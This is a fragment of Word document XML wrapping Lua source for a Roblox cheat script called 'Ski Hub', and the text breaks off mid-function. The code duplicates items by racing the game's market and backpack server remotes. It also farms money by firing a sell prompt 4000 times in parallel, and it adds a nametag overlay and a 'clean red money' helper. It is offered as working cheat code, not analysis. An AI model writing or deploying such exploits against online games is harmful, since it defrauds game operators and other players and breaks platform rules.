      <w:r>
        <w:t xml:space="preserve">                ForceRetrieveFromMarket(item.Name)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end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local function SetupCharacter(char)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    SaveOnDeath(char)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    RetrieveAfterSpawn()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>LocalPlayer.CharacterAdded:Connect(SetupCharacter)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>if LocalPlayer.Character then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    SetupCharacter(LocalPlayer.Character)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>-- anti lose end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>--nametag</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local Players = game:GetService("Players")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local RunService = game:GetService("RunService")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local Camera = workspace.CurrentCamera</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local LocalPlayer = Players.LocalPlayer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local HEIGHT_OFFSET = 1.8</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local Text = Drawing.new("Text")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Text.Text = "Ski Hub #1"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Text.Size = 26</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Text.Center = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Text.Font = 3</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Text.Outline = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Text.OutlineColor = Color3.fromRGB(40, 15, 70)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Text.Visible = false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local BASE_PURPLE = Color3.fromRGB(170, 100, 255)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local DARK_PURPLE = Color3.fromRGB(130, 70, 200)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local t = 0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>RunService.RenderStepped:Connect(function(dt)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not Config.TheBronx.PlayerModifications.Ski HubNameTag then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Text.Visible = false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local char = LocalPlayer.Character</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local head = char and char:FindFirstChild("Head")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not head then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Text.Visible = false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local pos, onScreen = Camera:WorldToViewportPoint(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        head.Position + Vector3.new(0, HEIGHT_OFFSET, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not onScreen then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Text.Visible = false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t += dt * 1.2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local pulse = (math.sin(t) + 1) / 2</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Text.Color = BASE_PURPLE:Lerp(DARK_PURPLE, pulse * 0.25)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Text.Position = Vector2.new(pos.X, pos.Y)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Text.Visible = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>--nametagend</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>-- normal dupe</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Cooldown = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                DupingSection:button({name = "Duplicate Once", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Cooldown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`Please wait!`,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>
      <w:r>
        <w:t xml:space="preserve">                            return</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Cooldown = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Player = Players.LocalPlayer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Backpack = Player.Backpack</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Tool = Player.Character:FindFirstChildOfClass("Tool")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Tool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`Could not find a tool! you must hold one.`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                lifetime = 10</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            })</w:t>
      </w:r>
    </w:p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Player.Character.Humanoid:UnequipTools()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local ToolName = Tool.Name</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local ToolId</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Connection = ReplicatedStorage.MarketItems.ChildAdded:Connect(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            function(item)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if item.Name == ToolName then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    if item:WaitForChild('owner').Value == Player.Name then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                        ToolId = item:GetAttribute('SpecialId')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)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ReplicatedStorage.ListWeaponRemote:FireServer(ToolName, 999999)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(.255) --26</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ReplicatedStorage.BackpackRemote:InvokeServer('Store', ToolName)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(3.02) --2.6</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ReplicatedStorage.BuyItemRemote:FireServer(ToolName, 'Remove', ToolId)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            ReplicatedStorage.BackpackRemote:InvokeServer("Grab", ToolName)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Connection:Disconnect()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Cooldown = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                DupingSection:label({wrapped = true, name = "Might Take A Few Tries! Be Patient."})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local VulnerabilitySection = Column:section({name = "Money Section", size = 0.450, default = false, side = 'right', icon = GetImage("unlocked.png")}) </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local GetFruitCup = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Found, Cup = false, nil;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for Index, Value in next, {LocalPlayer.Backpack:GetChildren(), LocalPlayer.Character:GetChildren()} do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        for _Index, _Value in Value do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if _Value:IsA("Tool") and _Value.Name == "Ice-Fruit Cupz" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if _Value["IceFruit Cup"]["IceFruit PunchMedium"].Transparency ~= 1 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Found = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Cup = _Value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    break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 </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return Found, Cup</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end)        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                                         </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>local function FreezeCharacter()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local char = LocalPlayer.Character</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not char then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local hum = char:FindFirstChild("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local hrp = char:FindFirstChild("HumanoidRootPart")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if hum then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        hum.WalkSpeed = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        hum.JumpPower = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        hum.AutoRotate = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if hrp then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        hrp.Anchored = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>local function UnfreezeCharacter()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local char = LocalPlayer.Character</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not char then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local hum = char:FindFirstChild("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local hrp = char:FindFirstChild("HumanoidRootPart")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if hum then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        hum.WalkSpeed = 16</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        hum.JumpPower = 50</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        hum.AutoRotate = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if hrp then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        hrp.Anchored = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>VulnerabilitySection:button({name = " Auto Generate Max Money", callback = function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local Found, Cup = GetFruitCup()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if Cup and Found then</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local OLDCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if Cup.Parent == LocalPlayer.Backpack then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            LocalPlayer.Character.Humanoid:EquipTool(Cup)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Teleport(Workspace["IceFruit Sell"].CFrame, true)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.wait(.5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        for Index=1, 4000 do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                _fireproximityprompt(Workspace["IceFruit Sell"].ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Teleport(OLDCFrame)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local OLDCFrame = LocalPlayer.Character.HumanoidRootPart.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local Itemz = {"FijiWater", "FreshWater", "Ice-Fruit Bag", "Ice-Fruit Cupz"}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    local Stove;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    for Index, Value in Workspace.CookingPots:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if Value:IsA("Model") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            if Value:FindFirstChildWhichIsA("ProximityPrompt", true).ActionText == "Turn On"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            and Value:FindFirstChildWhichIsA("ProximityPrompt", true).Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Stove = Value</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                break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for Index, Value in Itemz do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not LocalPlayer.Backpack:FindFirstChild(Value) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ReplicatedStorage:WaitForChild("ExoticShopRemote"):InvokeServer(Value)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            task.wait(0.1)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local Check = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    for Index, Value in Itemz do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not LocalPlayer.Backpack:FindFirstChild(Value) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Check = true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if Check then</w:t>
      </w:r>
    </w:p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`Could not find items! Please check you have more than 5000$.`,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            lifetime = 10</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        return</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Teleport(Stove.CookPart.CFrame, true)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    FreezeCharacter()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    fireproximityprompt(Stove:FindFirstChildWhichIsA("ProximityPrompt", true))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    task.wait(2)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    for Index, Value in {"FijiWater", "FreshWater", "Ice-Fruit Bag"} do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack[Value])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        fireproximityprompt(Stove:FindFirstChildWhichIsA("ProximityPrompt", true))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.wait(3)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    repeat task.wait() until Stove.CookPart.Steam.LoadUI.Enabled == false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not LocalPlayer.Character:FindFirstChild("Ice-Fruit Cupz") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack['Ice-Fruit Cupz'])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    fireproximityprompt(Stove:FindFirstChildWhichIsA("ProximityPrompt", true))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    task.wait(3)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    UnfreezeCharacter()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Teleport(Workspace["IceFruit Sell"].CFrame, true)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    FreezeCharacter()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    task.wait(1.5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    if not LocalPlayer.Character:FindFirstChild("Ice-Fruit Cupz") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        LocalPlayer.Character.Humanoid:EquipTool(LocalPlayer.Backpack['Ice-Fruit Cupz'])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Workspace["IceFruit Sell"].ProximityPrompt.HoldDuration = 0</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    for Index=1, 4000 do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            _fireproximityprompt(Workspace["IceFruit Sell"].ProximityPrompt)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    UnfreezeCharacter()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    task.wait(0.5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    Teleport(OLDCFrame, true)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    task.wait(2)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>end})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>VulnerabilitySection:button({name = "Clean All Red Money", callback = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if LocalPlayer.stored.FilthyStack.Value == 0 then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                info = "You have no money!",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                lifetime = 7.5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local character = LocalPlayer.Character</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not character or not character:FindFirstChild("HumanoidRootPart") then return end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local humanoid = character:FindFirstChild("Humanoid")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not humanoid or humanoid.Health == 0 then return end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local Cleaner = GetGoodCleaner()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        if not Cleaner then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            return library.notifications:create_notification({</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                name = "Ski Hub",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                info = "Could not find a valid cleaner!",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                lifetime = 7.5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            })</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        local OldCF = character.HumanoidRootPart.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
